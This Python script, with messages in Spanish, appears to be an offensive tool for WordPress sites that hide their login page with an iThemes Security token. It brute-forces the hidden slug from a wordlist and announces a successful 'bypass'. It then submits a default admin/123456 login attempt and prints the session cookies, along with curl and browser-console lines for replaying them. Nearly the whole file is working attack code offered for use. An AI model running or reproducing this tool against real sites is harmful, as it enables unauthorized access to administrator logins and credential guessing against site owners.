import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn
from rich.markup import escape

console = Console()

def is_login_page(html):
    """Detecta si la respuesta contiene el formulario típico de login de WordPress."""
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form", id="loginform")
    return form and form.find("input", {"name": "log"}) and form.find("input", {"name": "pwd"})

def cargar_slugs(ruta_archivo="utils/slugs.txt"):
    """Carga slugs desde un archivo TXT."""
    try:
        with open(ruta_archivo, "r", encoding="utf-8") as archivo:
            return [linea.strip() for linea in archivo if linea.strip()]
    except FileNotFoundError:
        console.print(f"[red]❌ Archivo no encontrado:[/red] {ruta_archivo}")
        return []

def validar_endpoint_login(session, login_url):
    """Realiza una petición POST simulando un login real para verificar funcionalidad."""
    payload = {
        'log': 'admin',
        'pwd': '123456',
        'wp-submit': 'Log In',
        'redirect_to': f'{login_url}/wp-admin/',
        'testcookie': '1'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        response = session.post(login_url, data=payload, headers=headers, timeout=10)
        if "incorrect" in response.text.lower() or "invalid" in response.text.lower():
            console.print("[green]🔐 Endpoint de login responde correctamente a POST (login funcional)[/green]")
        elif "captcha" in response.text.lower():
            console.print("[yellow]⚠️ Hay protección tipo CAPTCHA o WAF activado[/yellow]")
        else:
            console.print("[red]❌ El login no respondió como se esperaba. Puede estar bloqueado.[/red]")
    except Exception as e:
        console.print(f"[red]⛔ Error al validar login POST: {e}[/red]")

def detect_hidden_login(target_url):
    console.print(f"\n🔍 [bold]Iniciando escaneo de slugs ocultos en:[/bold] [cyan]{target_url}[/cyan]\n")

    slugs = cargar_slugs()
    if not slugs:
        return

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console
    ) as progress:

        task = progress.add_task("🔎 Probando slugs...", total=len(slugs))

        for slug in slugs:
            console.print(f"[blue]🔄 Probando slug:[/blue] [yellow]{slug}[/yellow]")
            login_url = f"{target_url}/wp-login.php?itsec-hb-token={slug}"
            session = requests.Session()

            try:
                # Primera petición con el token
                session.get(login_url, timeout=10)

                # Segunda petición directa al login con cookies
                response = session.get(f"{target_url}/wp-login.php", timeout=10)

                if is_login_page(response.text):
                    console.print(f"\n✅ [bold green]¡Bypass exitoso![/bold green] Slug válido: [cyan]{slug}[/cyan]")
                    console.print(f"🔗 [bold blue]Accede directamente:[/bold blue] {target_url}/wp-login.php\n")

                    # Validar endpoint POST
                    validar_endpoint_login(session, f"{target_url}/wp-login.php")

                    # Mostrar cookies de sesión
                    cookies_dict = session.cookies.get_dict()
                    if cookies_dict:
                        console.print("\n[bold cyan]🍪 Cookies de sesión activas:[/bold cyan]")
                        for k, v in cookies_dict.items():
                            console.print(f"[yellow]{k}[/yellow]=[green]{v}[/green]")

                        # Construir header de cookies
                        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())

                        # Instrucciones para curl
                        console.print(f"\n💡 Puedes probar con:\n[blue]curl -b \"{cookie_header}\" {target_url}/wp-login.php[/blue]")

                        # Instrucciones para consola navegador
                        js_cookie = " ".join([f'document.cookie = "{k}={v}";' for k, v in cookies_dict.items()])
                        console.print(f"\n💻 En la consola del navegador puedes ejecutar:\n[magenta]{js_cookie}[/magenta]")
                        console.print(f"🔁 Luego recarga manualmente: [cyan]{target_url}/wp-login.php[/cyan]")

                        # Guardar cookies en archivo
                        with open("cookies.txt", "w") as f:
                            f.write(cookie_header)
                        console.print("[green]📁 Cookies guardadas en:[/green] cookies.txt")

                    return

            except requests.RequestException:
                console.print(f"[red]⛔ Error al intentar acceder a {login_url}[/red]")

            progress.advance(task)

    console.print("\n❌ [bold red]No se encontró un slug válido.[/bold red]")
